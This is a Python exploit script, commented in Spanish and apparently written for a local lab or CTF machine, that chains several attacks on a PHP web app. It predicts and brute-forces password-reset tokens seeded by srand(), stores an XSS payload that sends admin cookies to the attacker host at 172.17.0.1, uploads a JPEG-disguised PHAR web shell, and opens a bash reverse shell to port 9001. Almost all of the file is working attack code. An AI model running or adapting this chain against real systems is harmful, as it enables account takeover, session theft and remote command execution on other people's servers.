import requests,argparse,subprocess,os,re,pdb,time,threading,codecs,signal
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from pwn import *

cookie_admin = ''

def handler(sig,frame):
    print("[!] Saliendo...")
    exit(1)


signal.signal(signal.SIGINT, handler)

# primero generar los tokens y hacer fuerza bruta para restablecer la constraseña
def generateSeeds():
    # date +%s%3N && sleep 1 && curl -s -X POST --url "http://172.17.0.2/forgotpassword.php" -d "username=user1" && sleep 1 && date +%s%3N
    output = os.popen('date +%s%3N && sleep 1 && curl -s -X POST --url "http://172.17.0.2/forgotpassword.php" -d "username=user1" && sleep 1 && date +%s%3N').read()
    seeds = re.findall("\d{13}", output)
    return seeds

def generateFile(seeds):
        seed1 = seeds[0]
        seed2 = seeds[1]
        os.remove("generateTokens_v2.php")
        with open('generateTokens_v2.php', 'w') as f:
            file_content = """<?php
        $seed1 = "%s";
        $seed2 = "%s";
        function generateToken($seed) {
            srand($seed);
            $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
            $ret = '';
            for ($i = 0; $i < 32; $i++) {
                $ret .= $chars[rand(0,strlen($chars)-1)];
            }
            return $ret;
        }
        for($i = $seed1; $i <= $seed2; $i++){
            $valor = generateToken($i);
            echo $valor . "\n";
        }
        ?>
        """ % (seed1,seed2)
            f.write(file_content)
            f.close()
            return


def generateTokens():
        os.remove("tokens.txt")
        os.system("php generateTokens_v2.php > tokens.txt")
        
def bruteforceToken(target):
    p1 = log.progress("")
    # payload = """bash -c 'for token in $(cat tokens.txt); do curl -X POST http://%s/resetpassword.php -d "token=$token&password1=Testing123&password2=Testing123" -x 127.0.0.1:8080; done >& /dev/null'""" % target
    url = "http://%s/resetpassword.php" % target
    with open('tokens.txt', 'r') as f:
        for token in f:
            token = token.strip()
            form_data = {'token': token, 'password1': 'Testing123', 'password2':'Testing123'}
            # proxies = {'http':'127.0.0.1:8080'}
            p1.status(f"Probando token {token}...")
            r = requests.post(url=url, data=form_data)
            if "Password changed!" in r.text:
                p1.status(f"Contraseña reseteada con token {token}")
                #s.headers.update({'Cookie':re.match("[^;]*", r.headers['Set-Cookie']).group(0)})
                return
    p1.error("No se ha encontrado ningún token válido")
    exit(1)

def logIn(target):
    s = requests.Session()
    url = "http://%s/login.php" % target
    form_data = {'username':'user1', 'password':'Testing123'}
    r = requests.post(url=url, data=form_data, allow_redirects=False)
    s.headers.update({'Cookie':re.match("[^;]*", r.headers['Set-Cookie']).group(0)})
    return s


# segundo escalar a admin mediante el XSS
def crearIndex():
    os.remove("index.js")
    file_content = """const req = new XMLHttpRequest();
req.open("POST", "http://172.17.0.1/cookie?c=" + document.cookie);
req.send();"""
    with open('index.js','w') as f:
        f.write(file_content)
        f.close()


def storeXSS(s,target):
    p2 = log.progress("Enviando payload XSS...")
    time.sleep(2)
    url = "http://%s/profile.php" % target
    form_data = {'description': 'test"><script src=http://172.17.0.1/index.js onerror=alert(2)></script>'}
    r = s.post(url=url, data=form_data)
    os.system("echo 'jajabait' > cookie")
    p2.status("XSS inyectado")
    return
    
    
class RequestHandler(BaseHTTPRequestHandler):
    def _send_response(self, file_path):
        """Envia el archivo en la respuesta."""
        try:
            with open(file_path, 'rb') as f:
                file_data = f.read()
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.send_header('Content-disposition', 'attachment; filename=' + file_path)
            self.end_headers()
            self.wfile.write(file_data)
        except FileNotFoundError:
            self.send_error(404, 'File not found')

    def do_GET(self):
        if self.path == '/index.js':
            self._send_response('./index.js') 

    def do_POST(self):
        global cookie_admin
        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)
        cookie_value = query_params.get("c", [None])[0]
        if cookie_value is not None:
            cookie_admin = cookie_value
        else:
            return


def run(server_class=HTTPServer, handler_class=RequestHandler):
    server_address = ('', 80)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()
    time.sleep(65)
    os.exit(0)

def closeServer():
    time.sleep(60)
    result = subprocess.run(["ps", "-ef"], stdout=subprocess.PIPE)
    output = result.stdout.decode("utf-8")
    pid = None
    for line in output.split("\n"):
        if "python3 -m http.server" in line:
            pid = line.split()[1]
            subprocess.run(["kill", pid])
    exit(0)


# tercero subir un phar en el upload image y obtener la shell
def createImage():
    os.remove("image_hex_sin_espacio_v2.jpeg")
    hex_value = "FFD8FFE000104A46494600010100000100010000FFDB0084000906071313121513131315161517171B1A191617181A1F1E1A1A1D181A181A1D181A181D2820181D251D1D1F21312125292B2E2E2E1F3033383330372F2F2F30010A0A0A0505050E05050E2B1913192B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2BFFC0001108009C000A"
    with open('image_hex_sin_espacio_v2.jpeg','w') as f:
        f.write(hex_value)
    print("Pseudo-imagen con hex_value creada")
    return

def convertHexToBytes():
    with open('image_hex_sin_espacio_v2.jpeg','r') as f: # hexadecimal
        file_content = f.read()
        file_content = file_content.strip()
        bytesObj = codecs.decode(file_content, 'hex_codec') # hexadecimal a bytes
    return bytesObj

def appendPayload(bytesObj):
    with open('final_payload.phar', 'wb') as f:
        f.write(bytesObj)
        f.close()
    with open('final_payload.phar', 'a') as f:
        f.write("\r\n<?php echo system($_GET['cmd']); ?>\r\n")
    return

def readFile():
    with open('final_payload.phar', 'rb') as f:
        file_content = f.read()
    return file_content

def uploadPhar(target,s,file_content):
    p3 = log.progress("Subiendo PHAR malicioso...")
    time.sleep(2)
    global cookie_admin
    url = f"http://{target}/admin/upload_image.php"
    s.headers.update({'Cookie':'PHPSESSID=q71sq8h017r10s5qt4ddb372t5'}) # pasamos de user1 a admin
    files = {'image': ('script_principal.phar', file_content, 'image/jpeg')}
    #proxies = {'http':'127.0.0.1:8080'}
    s.post(url=url, files=files)
    p3.status("Phar subido correctamente!")
    return

def reverseShell():
    url = f"http://172.17.0.2/images/script_principal.phar?cmd=bash -c 'bash -i %3e%26 /dev/tcp/172.17.0.1/9001 0%3e%261'"
    requests.get(url=url)
    return
    

if __name__ == '__main__':
    
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', required=True, help="Url víctima")
    args = parser.parse_args()
    seeds = generateSeeds()
    generateFile(seeds)
    generateTokens()
    bruteforceToken(args.target) # funciona todo
    session = logIn(args.target)
    crearIndex()
    storeXSS(session,args.target)
    threading.Thread(target=run, args=()).start()
    threading.Thread(target=closeServer, args=()).start()    
    createImage()
    bytesObj = convertHexToBytes()
    appendPayload(bytesObj)
    file_content = readFile()
    uploadPhar(args.target,session,file_content)
    threading.Thread(target=reverseShell, args=()).start()
    shell = listen(9001,timeout=20).wait_for_connection()
    shell.interactive()
       